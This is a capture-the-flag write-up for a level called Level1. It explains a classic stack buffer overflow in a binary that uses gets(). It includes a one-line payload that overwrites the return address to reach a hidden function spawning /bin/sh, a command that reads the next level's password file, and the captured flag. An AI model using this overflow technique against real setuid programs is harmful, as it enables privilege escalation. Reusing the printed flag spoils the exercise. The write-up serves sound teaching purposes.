# 💥 Level1 - Classic Buffer Overflow

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

Time to learn the classic buffer overflow! 🌊

## 📋 Binary Analysis

### 🔍 Main Function (Ghidra)
```c
void main(void)
{
  char local_50 [76];
  
  gets(local_50);
  return;
}
```

### 🎯 Hidden Run Function
```c
void run(void)
{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}
```

**Function address**: `0x08048444`

## 🚨 Vulnerability

### The Problem
- `gets()` is **notoriously unsafe** - no boundary checking! ⚠️
- Buffer is only **76 bytes**
- We can overflow to overwrite the **return address**
- Hidden `run()` function spawns a shell with level2 privileges

### The Stack Layout
```
[Buffer: 76 bytes] [Saved EBP: 4 bytes] [Return Address: 4 bytes]
```

## 🎯 How the Exploit Works

### Normal Execution
When `main()` is called normally:
1. The **return address** (where to go after main finishes) is pushed onto the stack
2. The 76-byte buffer is allocated on the stack
3. `gets()` reads user input into the buffer
4. When `main()` executes `ret`, it pops the return address from the stack into **EIP** (instruction pointer) and jumps back to the caller

### The Attack
Our malicious input does the following:
1. **Fill the buffer**: Send 76 bytes of 'A' (0x41) to completely fill the buffer and overwrite the saved EBP
2. **Overwrite return address**: Send 4 more bytes (`\x44\x84\x04\x08`) that overwrite the return address on the stack
3. **Hijack execution**: When `main()` executes `ret`, it does `EIP = [ESP]` where ESP points to our corrupted return address (`0x08048444`)
4. **Get shell**: CPU jumps to `run()` at `0x08048444`, which executes `system("/bin/sh")`, spawning a shell with level2 privileges

**Key insight:** The `ret` instruction automatically loads `[ESP]` into EIP. By controlling what's on the stack at ESP, we control where the program jumps!

### Memory State After Overflow

```
Stack Memory:                      CPU Registers:
─────────────────────────────────  EIP = 0x08048495 (at 'ret')
0xbffff7fc: 0x08048444 ← Hijacked! ESP = 0xbffff7fc ← Points here!
0xbffff7f8: 0x41414141 ← 'AAAA'    EBP = 0x41414141 (corrupted)
0xbffff7f4: 0x41414141 ← 'AAAA'
...
0xbffff7ac: 0x41414141 ← Buffer
─────────────────────────────────

When 'ret' executes:
  ret → EIP = [ESP] = 0x08048444 → Jump to run()! 🎉
```

### Execution Flow

**Normal:** `main() → ret → EIP = 0x08048xxx → back to caller`

**Exploited:** `main() → ret → EIP = 0x08048444 → run() → shell! 🚩`

## 💣 Exploit

### Crafting the Payload

```bash
(python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
```

**Breakdown**:
- `"A"*76` → Fill the buffer completely
- `"\x44\x84\x04\x08"` → Overwrite return address with `run()` address `0x08048444` in little-endian format
- `cat` → Keep stdin open to interact with the spawned shell

**Little-endian explanation**:
x86 processors store multi-byte values with the **least significant byte first**. The address `0x08048444` is stored in memory as bytes `44 84 04 08` (reversed). When we write `\x44\x84\x04\x08`, the CPU reads it back as `0x08048444`.

### Getting the Flag
```bash
cat /home/user/level2/.pass
```

## 🔑 Key Concepts

- 🚫 **Never use `gets()`** - it's deprecated for a reason!
- 🔄 **Little-endian** - bytes are reversed on x86
- 📚 **Stack layout** - understanding buffer → EBP → return address
- 🎭 **Hidden functions** - always check the symbol table
- 🐱 **`cat` trick** - keeps stdin open for interactive shells

## 🎓 Learning Points

| Concept | Description |
|---------|-------------|
| Buffer Overflow | Writing beyond allocated memory |
| Return Address | Pointer to code execution after function returns |
| Little-endian | Byte order: least significant byte first |
| SUID Binary | Runs with owner's privileges (level2) |

---

> 💡 **Pro Tip**: Use `(python -c '...'; cat)` pattern for any exploit that spawns an interactive shell!

> ⚠️ **Security Note**: This is why modern systems have stack canaries, ASLR, and DEP!

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```